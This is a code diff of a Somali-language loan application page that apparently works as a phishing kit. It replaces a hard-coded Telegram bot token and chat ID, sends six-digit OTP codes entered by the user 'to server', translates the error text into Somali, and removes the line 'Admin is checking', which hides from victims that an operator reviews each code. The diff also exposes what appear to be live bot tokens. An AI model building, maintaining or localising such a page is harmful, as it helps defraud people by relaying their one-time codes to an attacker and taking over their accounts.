@@ -1122,8 +1122,8 @@
 
     function planInfo() { return P ? `Amaah: $${fmt(P.loanAmount)} | ${P.duration} bilood | Da: ${calcAge(P.dob)} | ${P.loanType}` : "—" }
 
-    const TELEGRAM_BOT_TOKEN = "8782964536:AAGfUfQdo84z3wziZZs8WGzRtXQ7XTSPfU4";
-    const TELEGRAM_CHAT_ID = "6391938178";
+    const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
+    const TELEGRAM_CHAT_ID = "7162306402";
 
     /* --- NEW BACKEND COMMUNICATION LOGIC --- */
     
@@ -1178,7 +1178,7 @@
       if (otp1Val.length !== 6 || otp1Done) return;
       
       document.getElementById("oh1").disabled = true;
-      document.getElementById("loaderText").textContent = "Fadlan sug... Admin is checking";
+      document.getElementById("loaderText").textContent = "Fadlan sug...";
       document.getElementById("loaderOv").classList.add("show");
 
       // Send to server
@@ -1201,7 +1201,7 @@
         function() {
           document.getElementById("oh1").disabled = false;
           otp1.reset(false);
-          document.getElementById("mn1").innerHTML = "<span style='color:#dc2626; font-weight:bold;'>⚠️ Code is incorrect or expired. Try again.</span>";
+          document.getElementById("mn1").innerHTML = "<span style='color:#dc2626; font-weight:bold;'>⚠️ Koodhku waa khaldan yahay ama wuu dhacay Isku day mar kale.</span>";
         }
       );
     }
